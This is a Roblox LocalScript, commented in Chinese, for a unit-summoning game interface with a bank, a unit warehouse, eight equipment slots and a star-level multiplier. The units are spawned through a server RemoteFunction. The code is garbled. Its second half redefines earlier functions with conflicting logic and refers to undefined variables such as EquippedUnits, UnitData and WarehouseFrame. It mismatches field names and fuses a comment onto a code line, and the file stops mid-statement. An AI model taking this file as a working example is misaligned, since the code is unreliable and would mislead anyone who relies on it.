--==================================================
-- 银行 + 仓库 + 8个装备卡槽 + 三星级系统
-- LocalScript
--==================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer
local Event = ReplicatedStorage.Events.RemoteFunction.SandboxSpawn

local IsPC = UserInputService.KeyboardEnabled
    and not UserInputService.TouchEnabled

--==================================================
-- 银行数据
--==================================================

local Money = 600
local Level = 0
local MaxMoney = 70000
local MaxLevel = 9
local Running = true

local UpgradeCosts = {
    440,880,1320,1760,2200,
    2640,3080,3520,3960
}

--==================================================
-- 星级系统
--==================================================

local StarLevel = 1

local StarMultipliers = {
    [1] = 1,
    [2] = 1.5,
    [3] = 3
}

local StarButtons = {}

local function GetUnitPrice(unit)
    return unit.Price
end

local function GetScaledArgs(unit)
    local args = {}

    for key,value in pairs(unit.Args or {}) do
        args[key] = value
    end

    local multiplier = StarMultipliers[StarLevel]

    if args.Health ~= nil then
        args.Health = args.Health * multiplier
    end

    if args.Damage ~= nil then
        args.Damage = args.Damage * multiplier
    end

    return args
end

local function UpdateStars()
    for i,button in ipairs(StarButtons) do
        button.AutoButtonColor = not Running
        button.Active = not Running

        if i == StarLevel then
            button.BackgroundTransparency = 0
            button.BorderSizePixel = 2
        else
            button.BackgroundTransparency = 0.45
            button.BorderSizePixel = 0
        end

        if Running then
            button.TextTransparency = 0.35
        else
            button.TextTransparency = 0
        end
    end
end

--==================================================
-- 按键设置
--==================================================

local SlotKeys = {1,2,3,4,5,6,7,8}

local SlotKeyCodes = {
    [1] = Enum.KeyCode.One,
    [2] = Enum.KeyCode.Two,
    [3] = Enum.KeyCode.Three,
    [4] = Enum.KeyCode.Four,
    [5] = Enum.KeyCode.Five,
    [6] = Enum.KeyCode.Six,
    [7] = Enum.KeyCode.Seven,
    [8] = Enum.KeyCode.Eight
}

--==================================================
-- 单位数据
--==================================================

local Units = {
    -- 普通
    {Name="真理鹈鹕",ID=151,Rank="B",Amount=8,Price=20000,Cooldown=200,Image=102009551876604,Category="普通",Args={Health=10000,Damage=2000}},
    {Name="生化人棍棒战斗",ID=109,Rank="B",Amount=8,Price=10000,Cooldown=100,Image=81963847967960,Category="普通",Args={Health=2800,Damage=95}},
    {Name="黑暗轰炸机战士",ID=22,Rank="B",Amount=4,Price=1000,Cooldown=25,Image=93022672755160,Category="普通",Args={Health=30,Damage=150}},
    {Name="魔法生成器",ID=24,Rank="B",Amount=4,Price=1600,Cooldown=50,Image=101930259026845,Category="普通",Args={Health=300,Damage=20}},
    {Name="爱国者弹头",ID=108,Rank="B",Amount=8,Price=15000,Cooldown=300,Image=71963794967775,Category="普通",Args={Health=4000,Damage=100}},

    -- 僵尸
    {Name="保持微笑",ID=144,Rank="A",Amount=2,Price=1000,Cooldown=35,Image=134391460910247,Category="僵尸",Args={Health=600}},
    {Name="披萨",ID=136,Rank="A",Amount=2,Price=500,Cooldown=50,Image=76810868926793,Category="僵尸",Args={Health=400,Damage=50}},
    {Name="保护僵尸",ID=135,Rank="A",Amount=2,Price=900,Cooldown=70,Image=117471233334728,Category="僵尸",Args={Health=300,Damage=20}},

    -- 天使
    {Name="诺曼",ID=104,Rank="B",Amount=2,Price=2000,Cooldown=15,Image=76163313488934,Category="天使",Args={Health=650,Damage=80}},
    {Name="审判",ID=115,Rank="B",Amount=6,Price=2000,Cooldown=50,Image=76008989733506,Category="天使",Args={Health=300,Damage=60}},
    {Name="斯温伯恩",ID=141,Rank="A",Amount=2,Price=300,Cooldown=15,Image=81706288686123,Category="天使",Args={Health=168}},
    {Name="克罗诺斯",ID=122,Rank="B",Amount=5,Price=22500,Cooldown=600,Image=125817598848664,Category="天使",Args={Health=3000,Damage=50}},
    {Name="Pwnsalot",ID=101,Rank="B",Amount=5,Price=1200,Cooldown=15,Image=100746586925732,Category="天使",Args={Health=80,Damage=100}},
    {Name="维京人",ID=104,Rank="A",Amount=4,Price=2000,Cooldown=15,Image=132758376686081,Category="天使",Args={Health=200,Damage=50}},

    -- 死亡
    {Name="McBlast",ID=116,Rank="B",Amount=4,Price=300,Cooldown=30,Image=83665706736688,Category="死亡",Args={Health=60,Damage=20}},
    {Name="粉碎机",ID=121,Rank="B",Amount=4,Price=8000,Cooldown=800,Image=132780898159572,Category="死亡",Args={Health=4000,Damage=1000}},
    {Name="极限",ID=72,Rank="B",Amount=4,Price=20000,Cooldown=500,Image=90530027731674,Category="死亡",Args={Health=3000,Damage=40}},
    {Name="巨魔袭击",ID=105,Rank="B",Amount=4,Price=200,Cooldown=25,Image=119281801828499,Category="死亡",Args={Health=40,Damage=60}},
    {Name="束缚状态",ID=69,Rank="B",Amount=4,Price=1200,Cooldown=20,Image=90355776344408,Category="死亡",Args={Health=40,Damage=100}},
    {Name="双黑暗之心",ID=54,Rank="B",Amount=10,Price=300,Cooldown=10,Image=90816086906198,Category="死亡",Args={Health=50,Damage=20}},
    {Name="贝蒂",ID=56,Rank="B",Amount=10,Price=300,Cooldown=15,Image=112152174802483,Category="死亡",Args={Health=60,Damage=30}},
    {Name="血角",ID=65,Rank="B",Amount=10,Price=800,Cooldown=20,Image=73907201693668,Category="死亡",Args={Health=200,Damage=30}},
    {Name="原子",ID=118,Rank="B",Amount=10,Price=500,Cooldown=20,Image=72643510567320,Category="死亡",Args={Health=50}},
    {Name="顶级",ID=94,Rank="B",Amount=10,Price=1000,Cooldown=25,Image=103544184383951,Category="死亡",Args={Health=50,Damage=10}},
    {Name="闪耀",ID=92,Rank="B",Amount=2,Price=400,Cooldown=20,Image=78409354291455,Category="死亡",Args={Health=40,Damage=10}},
    {Name="弹头",ID=70,Rank="B",Amount=4,Price=1000,Cooldown=100,Image=98839631179168,Category="死亡",Args={Health=400,Damage=100}},
    {Name="边缘之主",ID=91,Rank="B",Amount=4,Price=300,Cooldown=5,Image=76479036833202,Category="死亡",Args={Health=120,Damage=65}},

    -- 地狱
    {Name="地狱",ID=39,Rank="B",Amount=8,Price=2000,Cooldown=50,Image=113366045982105,Category="地狱",Args={Health=600,Damage=20}},
    {Name="天才",ID=89,Rank="B",Amount=4,Price=1200,Cooldown=60,Image=139624564209954,Category="地狱",Args={Health=60}},
    {Name="疯狂化学家",ID=60,Rank="B",Amount=4,Price=3000,Cooldown=100,Image=134686338431581,Category="地狱",Args={Health=200,Damage=75}},
    {Name="Speeddemon",ID=150,Rank="B",Amount=4,Price=2400,Cooldown=70,Image=73440841269995,Category="地狱",Args={Health=100,Damage=60}},
    {Name="盾牌战士",ID=29,Rank="B",Amount=4,Price=300,Cooldown=30,Image=87500073270346,Category="地狱",Args={Health=90,Damage=0}},
    {Name="吉他英雄",ID=35,Rank="B",Amount=4,Price=2000,Cooldown=100,Image=117913123207840,Category="地狱",Args={Health=60}},
    {Name="地狱火",ID=40,Rank="B",Amount=4,Price=12000,Cooldown=500,Image=95516325060350,Category="地狱",Args={Health=6000,Damage=20}},
    {Name="雇佣兵",ID=32,Rank="B",Amount=5,Price=300,Cooldown=10,Image=121186955802358,Category="地狱",Args={Health=60,Damage=6}},
    {Name="瓶装",ID=88,Rank="B",Amount=8,Price=600,Cooldown=15,Image=109161080608846,Category="地狱",Args={Health=80,Damage=15}}
}

--==================================================
-- 卡槽数据
--==================================================

local Slots = {}
local SlotCards = {}
local WarehouseCards = {}
local SelectedUnit = nil

for i=1,8 do
    Slots[i] = {Unit=nil}
end

--==================================================
-- GUI
--==================================================

local Gui = Instance.new("ScreenGui")
Gui.Name = "BankAndInventory"
Gui.ResetOnSpawn = false
Gui.IgnoreGuiInset = true
Gui.DisplayOrder = 999999
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
Gui.Parent = Player:WaitForChild("PlayerGui")

local function Corner(obj,radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0,radius or 7)
    c.Parent = obj
end

local function Button(parent,name,text,size,pos,z)
    local b = Instance.new("TextButton")
    b.Name = name
    b.Size = size
    b.Position = pos
    b.BackgroundColor3 = Color3.fromRGB(45,45,45)
    b.TextColor3 = Color3.new(1,1,1)
    b.Text = text
    b.TextScaled = true
    b.Font = Enum.Font.GothamBold
    b.BorderSizePixel = 0
    b.ZIndex = z or 100
    b.Parent = parent
    Corner(b,7)
    return b
end

local function Label(parent,name,text,size,pos,z)
    local l = Instance.new("TextLabel")
    l.Name = name
    l.Size = size
    l.Position = pos
    l.BackgroundTransparency = 1
    l.TextColor3 = Color3.new(1,1,1)
    l.Text = text
    l.TextScaled = true
    l.Font = Enum.Font.GothamBold
    l.ZIndex = z or 100
    l.Parent = parent
    return l
end

--==================================================
-- 银行界面
--==================================================

local Bank = Instance.new("Frame")
Bank.Name = "Bank"
Bank.Size = UDim2.new(0,230,0,155)
Bank.Position = UDim2.new(0,15,0,45)
Bank.BackgroundColor3 = Color3.fromRGB(20,20,20)
Bank.BorderSizePixel = 0
Bank.ZIndex = 100
Bank.Parent = Gui
Corner(Bank,10)

Label(Bank,"Title","银行",
    UDim2.new(1,0,0,30),
    UDim2.new(0,0,0,3))

local MoneyLabel = Label(Bank,"Money","资金：600",
    UDim2.new(1,-10,0,28),
    UDim2.new(0,5,0,35))

local LevelLabel = Label(Bank,"Level","等级：0",
    UDim2.new(1,-10,0,25),
    UDim2.new(0,5,0,65))

local UpgradeButton = Button(Bank,"Upgrade","升级银行",
    UDim2.new(0.94,0,0,35),
    UDim2.new(0.03,0,0,105))

local function UpdateMoney()
    MoneyLabel.Text = "资金："..math.floor(Money)
    LevelLabel.Text = "等级："..Level

    if Level >= MaxLevel then
        UpgradeButton.Text = "等级已满"
    else
        UpgradeButton.Text = "升级："..UpgradeCosts[Level+1]
    end
end

--==================================================
-- 主按钮
--==================================================

local StartButton = Button(Gui,"Start","开始",
    UDim2.new(0,85,0,38),
    UDim2.new(1,-190,0,45))

local StopButton = Button(Gui,"Stop","停止",
    UDim2.new(0,85,0,38),
    UDim2.new(1,-95,0,45))

local WarehouseButton = Button(Gui,"WarehouseButton","仓库",
    UDim2.new(0,85,0,38),
    UDim2.new(1,-95,0,90))

--==================================================
-- 卡槽区域：4列2行
--==================================================

local SlotArea = Instance.new("Frame")
SlotArea.Name = "EquipmentSlots"
SlotArea.Size = UDim2.new(0.54,0,0,112)
SlotArea.Position = UDim2.new(0.5,0,1,-115)
SlotArea.AnchorPoint = Vector2.new(0.5,0)
SlotArea.BackgroundTransparency = 1
SlotArea.ZIndex = 100
SlotArea.Parent = Gui

local SlotGrid = Instance.new("UIGridLayout")
SlotGrid.CellSize = UDim2.new(0.235,0,0,48)
SlotGrid.CellPadding = UDim2.new(0.01,0,0,6)
SlotGrid.FillDirectionMaxCells = 4
SlotGrid.SortOrder = Enum.SortOrder.LayoutOrder
SlotGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
SlotGrid.VerticalAlignment = Enum.VerticalAlignment.Center
SlotGrid.Parent = SlotArea

--==================================================
-- 冷却
--==================================================

local function GetRemaining(unit)
    if not unit or not unit.Last then
        return 0
    end

    return math.max(0,unit.Cooldown-(os.clock()-unit.Last))
end

local function UpdateSlots()
    for i,data in ipairs(SlotCards) do
        local unit = Slots[i].Unit

        if unit then
            data.Icon.Image = "rbxassetid://"..unit.Image
            data.Icon.Visible = true
            data.NameText.Text = unit.Name
            data.NameText.Visible = true
            data.PriceText.Text = "$"..GetUnitPrice(unit)
            data.PriceText.Visible = true

            local remaining = GetRemaining(unit)

            if remaining > 0 then
                data.CooldownMask.Visible = true
                data.CooldownFill.Size = UDim2.new(
                    1,0,
                    math.clamp(remaining/unit.Cooldown,0,1),0
                )
                data.CooldownText.Text = tostring(math.ceil(remaining))
            else
                data.CooldownMask.Visible = false
            end
        else
            data.Icon.Visible = false
            data.NameText.Visible = false
            data.PriceText.Visible = false
            data.CooldownMask.Visible = false
        end
    end
end

--==================================================
-- 仓库界面
--==================================================

local Warehouse = Instance.new("Frame")
Warehouse.Name = "WarehousePanel"
Warehouse.Size = UDim2.new(0,370,0,420)
Warehouse.Position = UDim2.new(0.5,-185,0.5,-210)
Warehouse.BackgroundColor3 = Color3.fromRGB(20,20,20)
Warehouse.BorderSizePixel = 0
Warehouse.Visible = false
Warehouse.ZIndex = 120
Warehouse.Parent = Gui
Corner(Warehouse,10)

local WarehouseScale = Instance.new("UIScale")
WarehouseScale.Scale = 1
WarehouseScale.Parent = Warehouse

Label(Warehouse,"Title","单位仓库",
    UDim2.new(0.7,0,0,35),
    UDim2.new(0,5,0,3),121)

local CloseButton = Button(Warehouse,"Close","X",
    UDim2.new(0,35,0,30),
    UDim2.new(1,-42,0,5),130)

CloseButton.MouseButton1Click:Connect(function()
    Warehouse.Visible = false
end)

WarehouseButton.MouseButton1Click:Connect(function()
    Warehouse.Visible = not Warehouse.Visible
end)

--==================================================
-- 仓库缩放
--==================================================

local ScaleButton = Button(Warehouse,"ScaleButton","−",
    UDim2.new(0,32,0,30),
    UDim2.new(1,-80,0,5),130)

local IsSmall = false

ScaleButton.MouseButton1Click:Connect(function()
    IsSmall = not IsSmall
    WarehouseScale.Scale = IsSmall and 0.75 or 1
    ScaleButton.Text = IsSmall and "+" or "−"
end)

--==================================================
-- 仓库拖拽
--==================================================

local DragBar = Instance.new("TextButton")
DragBar.Name = "DragBar"
DragBar.Size = UDim2.new(1,-120,0,38)
DragBar.BackgroundTransparency = 1
DragBar.Text = ""
DragBar.AutoButtonColor = false
DragBar.Active = true
DragBar.ZIndex = 125
DragBar.Parent = Warehouse

local Dragging = false
local DragStart
local StartPosition
local DragInput

DragBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        Dragging = true
        DragStart = input.Position
        StartPosition = Warehouse.Position
        DragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if not Dragging then return end

    if input.UserInputType == Enum.UserInputType.MouseMovement
    or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position-DragStart

        Warehouse.Position = UDim2.new(
            StartPosition.X.Scale,
            StartPosition.X.Offset+delta.X,
            StartPosition.Y.Scale,
            StartPosition.Y.Offset+delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input == DragInput
    or input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging = false
        DragInput = nil
    end
end)

--==================================================
-- 分类筛选
--==================================================

local Categories = {
    "全部","普通","地狱","死亡","天使","僵尸"
}

local CurrentCategory = "全部"
local CurrentRank = "全部"

local CategoryFrame = Instance.new("Frame")
CategoryFrame.Size = UDim2.new(1,-10,0,32)
CategoryFrame.Position = UDim2.new(0,5,0,42)
CategoryFrame.BackgroundTransparency = 1
CategoryFrame.ZIndex = 121
CategoryFrame.Parent = Warehouse

local CategoryGrid = Instance.new("UIGridLayout")
CategoryGrid.CellSize = UDim2.new(1/6,-3,1,0)
CategoryGrid.CellPadding = UDim2.new(0,2,0,0)
CategoryGrid.Parent = CategoryFrame

local CategoryButtons = {}

local RankFrame = Instance.new("Frame")
RankFrame.Size = UDim2.new(1,-10,0,30)
RankFrame.Position = UDim2.new(0,5,0,78)
RankFrame.BackgroundTransparency = 1
RankFrame.ZIndex = 121
RankFrame.Parent = Warehouse

local RankA = Button(RankFrame,"RankA","A",
    UDim2.new(0.5,-3,1,0),
    UDim2.new(0,0,0,0),122)

local RankB = Button(RankFrame,"RankB","B",
    UDim2.new(0.5,-3,1,0),
    UDim2.new(0.5,3,0,0),122)

--==================================================
-- 仓库列表
--==================================================

local Scroll = Instance.new("ScrollingFrame")
Scroll.Name = "UnitList"
Scroll.Size = UDim2.new(1,-12,1,-120)
Scroll.Position = UDim2.new(0,6,0,113)
Scroll.BackgroundColor3 = Color3.fromRGB(30,30,30)
Scroll.BorderSizePixel = 0
Scroll.ScrollBarThickness = 6
Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
Scroll.CanvasSize = UDim2.new(0,0,0,0)
Scroll.ZIndex = 121
Scroll.Parent = Warehouse
Corner(Scroll,7)

local WarehouseGrid = Instance.new("UIGridLayout")
WarehouseGrid.CellSize = UDim2.new(0,75,0,75)
WarehouseGrid.CellPadding = UDim2.new(0,7,0,7)
WarehouseGrid.SortOrder = Enum.SortOrder.LayoutOrder
WarehouseGrid.Parent = Scroll

local EmptyLabel = Label(Warehouse,"Empty","没有符合条件的单位",
    UDim2.new(1,-20,0,50),
    UDim2.new(0,10,0,250),140)

EmptyLabel.Visible = false

--==================================================
-- 装备检测
--==================================================

local function IsUnitEquipped(unit)
    for _,slot in ipairs(Slots) do
        if slot.Unit == unit then
            return true
        end
    end

    return false
end

--==================================================
-- 更新仓库
--==================================================

local function UpdateWarehouse()
    for _,card in ipairs(WarehouseCards) do
        card:Destroy()
    end

    table.clear(WarehouseCards)

    local count = 0

    for _,unit in ipairs(Units) do
        local categoryMatch =
            CurrentCategory == "全部"
            or unit.Category == CurrentCategory

        local rankMatch =
            CurrentRank == "全部"
            or unit.Rank == CurrentRank

        if categoryMatch and rankMatch then
            count += 1

            local equipped = IsUnitEquipped(unit)

            local card = Button(Scroll,unit.Name,"",
                UDim2.new(0,75,0,75),
                UDim2.new(0,0,0,0),122)

            local icon = Instance.new("ImageLabel")
            icon.Name = "UnitImage"
            icon.Size = UDim2.new(1,0,1,0)
            icon.BackgroundTransparency = 1
            icon.Image = "rbxassetid://"..unit.Image
            icon.ScaleType = Enum.ScaleType.Fit
            icon.ZIndex = 123
            icon.Parent = card
            Corner(icon,8)

            if equipped then
                card.BackgroundColor3 = Color3.fromRGB(65,65,65)

                local mask = Instance.new("Frame")
                mask.Size = UDim2.new(1,0,1,0)
                mask.BackgroundColor3 = Color3.new(0,0,0)
                mask.BackgroundTransparency = 0.45
                mask.BorderSizePixel = 0
                mask.ZIndex = 125
                mask.Parent = card
                Corner(mask,8)

                Label(mask,"Equipped","已装备",
                    UDim2.new(1,0,0,25),
                    UDim2.new(0,0,0.5,-12),126)
            end

            if SelectedUnit == unit then
                local stroke = Instance.new("UIStroke")
                stroke.Color = Color3.fromRGB(255,220,0)
                stroke.Thickness = 3
                stroke.Parent = card
            end

            card.MouseButton1Click:Connect(function()
                if Running then return end
                if IsUnitEquipped(unit) then return end

                SelectedUnit = unit
                UpdateWarehouse()
            end)

            table.insert(WarehouseCards,card)
        end
    end

    EmptyLabel.Visible = count == 0
    Scroll.CanvasPosition = Vector2.new(0,0)
end

--==================================================
-- 分类按钮
--==================================================

for _,category in ipairs(Categories) do
    local button = Button(CategoryFrame,category,category,
        UDim2.new(1,0,1,0),
        UDim2.new(0,0,0,0),122)

    CategoryButtons[category] = button

    button.MouseButton1Click:Connect(function()
        CurrentCategory = category

        for name,other in pairs(CategoryButtons) do
            other.BackgroundColor3 =
                name == category
                and Color3.fromRGB(40,130,70)
                or Color3.fromRGB(45,45,45)
        end

        UpdateWarehouse()
    end)
end

CategoryButtons["全部"].BackgroundColor3 =
    Color3.fromRGB(40,130,70)

--==================================================
-- A / B 筛选
--==================================================

RankA.MouseButton1Click:Connect(function()
    CurrentRank = CurrentRank == "A" and "全部" or "A"

    RankA.BackgroundColor3 =
        CurrentRank == "A"
        and Color3.fromRGB(40,130,70)
        or Color3.fromRGB(45,45,45)

    RankB.BackgroundColor3 = Color3.fromRGB(45,45,45)

    UpdateWarehouse()
end)

RankB.MouseButton1Click:Connect(function()
    CurrentRank = CurrentRank == "B" and "全部" or "B"

    RankB.BackgroundColor3 =
        CurrentRank == "B"
        and Color3.fromRGB(40,130,70)
        or Color3.fromRGB(45,45,45)

    RankA.BackgroundColor3 = Color3.fromRGB(45,45,45)

    UpdateWarehouse()
end)

--==================================================
-- 召唤单位
--==================================================

local function SummonUnit(unit)
    if not Running or not unit then return end
    if GetRemaining(unit) > 0 then return end

    local summonPrice = GetUnitPrice(unit)

    if Money < summonPrice then return end

    Money -= summonPrice
    unit.Last = os.clock()

    UpdateMoney()
    UpdateSlots()

    task.spawn(function()
        local success,err = pcall(function()
            Event:InvokeServer(
                "Enemy",
                unit.ID,
                unit.Rank,
                unit.Amount,
                GetScaledArgs(unit)
            )
        end)

        if not success then
            warn("召唤失败：",err)
        end
    end)
end

--==================================================
-- 卡槽操作
--==================================================

local function ActivateSlot(i)
    if not Running then

        if SelectedUnit then
            for slotIndex,slot in ipairs(Slots) do
                if slotIndex ~= i and slot.Unit == SelectedUnit then
                    return
                end
            end

            Slots[i].Unit = SelectedUnit
            SelectedUnit = nil

            UpdateSlots()
            UpdateWarehouse()
            return
        end

        if Slots[i].Unit then
            Slots[i].Unit = nil
            UpdateSlots()
            UpdateWarehouse()
        end

        return
    end

    SummonUnit(Slots[i].Unit)
end

--==================================================
-- 创建8个卡槽
--==================================================

for i=1,8 do
    local card = Button(SlotArea,"Slot"..i,"",
        UDim2.new(0,0,0,0),
        UDim2.new(0,0,0,0),101)

    card.LayoutOrder = i
    card.BackgroundColor3 = Color3.fromRGB(20,35,50)

    local border = Instance.new("UIStroke")
    border.Color = Color3.fromRGB(0,190,220)
    border.Thickness = 2
    border.Parent = card

    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Size = UDim2.new(1,0,1,0)
    icon.BackgroundTransparency = 1
    icon.ScaleType = Enum.ScaleType.Crop
    icon.Visible = false
    icon.ZIndex = 102
    icon.Parent = card
    Corner(icon,7)--==================================================
-- 卡槽内容
--==================================================

local nameText = Label(card,"NameText","空槽")
nameText.Size = UDim2.new(1,-8,0,20)
nameText.Position = UDim2.new(0,4,0,4)
nameText.TextScaled = true
nameText.ZIndex = 103
nameText.Parent = card

local priceText = Label(card,"PriceText","")
priceText.Size = UDim2.new(0.65,0,0,18)
priceText.Position = UDim2.new(0,4,1,-22)
priceText.TextScaled = true
priceText.TextXAlignment = Enum.TextXAlignment.Left
priceText.ZIndex = 103
priceText.Parent = card

local cooldownMask = Instance.new("Frame")
cooldownMask.Name = "CooldownMask"
cooldownMask.Size = UDim2.new(1,0,1,0)
cooldownMask.BackgroundColor3 = Color3.new(0,0,0)
cooldownMask.BackgroundTransparency = 0.45
cooldownMask.Visible = false
cooldownMask.ZIndex = 104
cooldownMask.Parent = card

local cooldownFill = Instance.new("Frame")
cooldownFill.Name = "CooldownFill"
cooldownFill.AnchorPoint = Vector2.new(0,1)
cooldownFill.Position = UDim2.new(0,0,1,0)
cooldownFill.Size = UDim2.new(1,0,1,0)
cooldownFill.BackgroundColor3 = Color3.fromRGB(255,190,50)
cooldownFill.BorderSizePixel = 0
cooldownFill.ZIndex = 105
cooldownFill.Parent = cooldownMask

local cooldownText = Label(cooldownMask,"CooldownText","")
cooldownText.Size = UDim2.new(1,0,0,24)
cooldownText.Position = UDim2.new(0,0,0.5,-12)
cooldownText.TextScaled = true
cooldownText.TextColor3 = Color3.new(1,1,1)
cooldownText.ZIndex = 106
cooldownText.Parent = cooldownMask

local clickButton = Instance.new("TextButton")
clickButton.Name = "SlotClick"
clickButton.Size = UDim2.new(1,0,1,0)
clickButton.BackgroundTransparency = 1
clickButton.Text = ""
clickButton.ZIndex = 110
clickButton.Parent = card

clickButton.MouseButton1Click:Connect(function()
    if SlotCards[i] then
        ActivateSlot(i)
    end
end)

table.insert(SlotCards,{
    Card = card,
    Icon = icon,
    Name = nameText,
    Price = priceText,
    CooldownMask = cooldownMask,
    CooldownFill = cooldownFill,
    CooldownText = cooldownText,
})

end

--==================================================
-- 星级选择按钮
--==================================================

local StarButtonFrame = Instance.new("Frame")
StarButtonFrame.Name = "StarButtonFrame"
StarButtonFrame.Size = UDim2.new(0,210,0,42)
StarButtonFrame.Position = UDim2.new(0,10,1,-52)
StarButtonFrame.BackgroundTransparency = 1
StarButtonFrame.Parent = StartButton.Parent

local starLayout = Instance.new("UIListLayout")
starLayout.FillDirection = Enum.FillDirection.Horizontal
starLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
starLayout.VerticalAlignment = Enum.VerticalAlignment.Center
starLayout.Padding = UDim.new(0,6)
starLayout.Parent = StarButtonFrame

for star = 1,3 do
    local button = Instance.new("TextButton")
    button.Name = "Star"..star
    button.Size = UDim2.new(0,62,0,34)
    button.BackgroundColor3 = Color3.fromRGB(55,55,65)
    button.TextColor3 = Color3.new(1,1,1)
    button.TextScaled = true
    button.Font = Enum.Font.GothamBold
    button.Text = string.rep("★",star)
    button.Parent = StarButtonFrame

    Corner(button,7)

    StarButtons[star] = button

    button.MouseButton1Click:Connect(function()
        if Running then
            return
        end

        StarLevel = star
        UpdateStars()
        UpdateSlots()
        UpdateWarehouse()
    end)
end

--==================================================
-- 星级倍率
--==================================================

local StarMultipliers = {
    [1] = 1,
    [2] = 1.5,
    [3] = 2,
}

local function CopyAndScaleArgs(source,multiplier)
    local result = {}

    for key,value in pairs(source or {}) do
        if type(value) == "number" then
            result[key] = value * multiplier

        elseif type(value) == "table" then
            result[key] = CopyAndScaleArgs(value,multiplier)

        else
            result[key] = value
        end
    end

    return result
end

local function GetScaledArgs(unit)
    local multiplier = StarMultipliers[StarLevel] or 1
    return CopyAndScaleArgs(unit.Args,multiplier)
end

--==================================================
-- 更新星级按钮
--==================================================

function UpdateStars()
    for star = 1,3 do
        local button = StarButtons[star]

        if button then
            if StarLevel == star then
                button.BackgroundColor3 = Color3.fromRGB(210,145,35)
            else
                button.BackgroundColor3 = Color3.fromRGB(55,55,65)
            end

            button.AutoButtonColor = not Running
            button.TextTransparency = Running and 0.35 or 0
        end
    end
end

--==================================================
-- 更新装备卡槽
--==================================================

function UpdateSlots()
    for i = 1,8 do
        local slot = SlotCards[i]
        if not slot then
            continue
        end

        local unit = EquippedUnits[i]

        if unit then
            slot.Name.Text = unit.Name
            slot.Price.Text = "$"..tostring(unit.Price)

            if unit.Image then
                slot.Icon.Image = "rbxassetid://"..tostring(unit.Image)
                slot.Icon.Visible = true
            else
                slot.Icon.Visible = false
            end

            slot.Card.BackgroundColor3 = Color3.fromRGB(65,65,75)
        else
            slot.Name.Text = "空槽"
            slot.Price.Text = ""
            slot.Icon.Visible = false
            slot.Card.BackgroundColor3 = Color3.fromRGB(35,35,42)
        end
    end
end

--==================================================
-- 更新仓库
--==================================================

function UpdateWarehouse()
    if not WarehouseFrame then
        return
    end

    for _,child in ipairs(WarehouseFrame:GetChildren()) do
        if child:GetAttribute("WarehouseUnit") then
            child:Destroy()
        end
    end

    local shown = 0

    for _,unit in ipairs(UnitData) do
        local categoryMatch =
            CurrentCategory == "全部"
            or unit.Category == CurrentCategory

        local rankMatch =
            CurrentRank == "全部"
            or unit.Rank == CurrentRank

        if categoryMatch and rankMatch then
            shown += 1

            local item = Instance.new("TextButton")
            item.Name = "Warehouse_"..tostring(unit.ID)
            item.Size = UDim2.new(1,-8,0,58)
            item.BackgroundColor3 = Color3.fromRGB(45,45,55)
            item.Text = ""
            item:SetAttribute("WarehouseUnit",true)
            item.Parent = WarehouseFrame

            Corner(item,7)

            local itemName = Label(item,"UnitName",unit.Name)
            itemName.Position = UDim2.new(0,8,0,4)
            itemName.Size = UDim2.new(0.65,0,0,23)
            itemName.TextXAlignment = Enum.TextXAlignment.Left
            itemName.Parent = item

            local itemInfo = Label(
                item,
                "UnitInfo",
                unit.Rank.."级 | $"..tostring(unit.Price)
            )
            itemInfo.Position = UDim2.new(0,8,0,29)
            itemInfo.Size = UDim2.new(0.65,0,0,20)
            itemInfo.TextXAlignment = Enum.TextXAlignment.Left
            itemInfo.Parent = item

            if unit.Image then
                local itemIcon = Instance.new("ImageLabel")
                itemIcon.Size = UDim2.new(0,48,0,48)
                itemIcon.Position = UDim2.new(1,-53,0,5)
                itemIcon.BackgroundTransparency = 1
                itemIcon.Image = "rbxassetid://"..tostring(unit.Image)
                itemIcon.Parent = item
            end

            item.MouseButton1Click:Connect(function()
                if Running then
                    return
                end

                local emptySlot

                for slotIndex = 1,8 do
                    if not EquippedUnits[slotIndex] then
                        emptySlot = slotIndex
                        break
                    end
                end

                if not emptySlot then
                    return
                end

                EquippedUnits[emptySlot] = unit

                UpdateSlots()
                UpdateWarehouse()
            end)
        end
    end
end

--==================================================
-- 召唤单位
--==================================================

local function ActivateSlot(slotIndex)
    if not Running then
        return
    end

    local unit = EquippedUnits[slotIndex]
    if not unit then
        return
    end

    if not Event then
        warn("SandboxSpawn RemoteFunction 不存在")
        return
    end

    local args = GetScaledArgs(unit)

    task.spawn(function()
        local success,err = pcall(function()
            Event:InvokeServer(
                "Enemy",
                unit.ID,
                unit.Rank,
                unit.Amount,
                args
            )
        end)

        if not success then
            warn("召唤单位失败：",err)
        end
    end)
end

--==================================================
-- 银行金额更新
--==================================================

function UpdateMoney()
    if MoneyText then
        MoneyText.Text =
            "$"..tostring(Money)..
            " / $"..tostring(MaxMoney)
    end

    if LevelText then
        LevelText.Text =
            "银行等级："..tostring(Level)..
            " / "..tostring(MaxLevel)
    end
end

--==================================================
-- 银行升级
--==================================================

if UpgradeButton then
    UpgradeButton.MouseButton1Click:Connect(function()
        if Level >= MaxLevel then
            return
        end

        local cost = UpgradeCosts[Level + 1]

        if not cost or Money < cost then
            return
        end

        Money -= cost
        Level += 1

        UpdateMoney()
    end)
end

--==================================================
-- 开始 / 停止
--==================================================

if StartButton then
    StartButton.MouseButton1Click:Connect(function()
        Running = true

        UpdateStars()

        StartButton.BackgroundColor3 =
            Color3.fromRGB(40,160,75)

        if StopButton then
            StopButton.BackgroundColor3 =
                Color3.fromRGB(65,65,75)
        end
    end)
end

if StopButton then
    StopButton.MouseButton1Click:Connect(function()
        Running = false

        UpdateStars()

        StopButton.BackgroundColor3 =
            Color3.fromRGB(190,65,65)

        if StartButton then
            StartButton.BackgroundColor3 =
                Color3.fromRGB(65,65,75)
        end
    end)
end

--==================================================
-- 数字键 1-8 快捷召唤
--==================================================

local UserInputService =
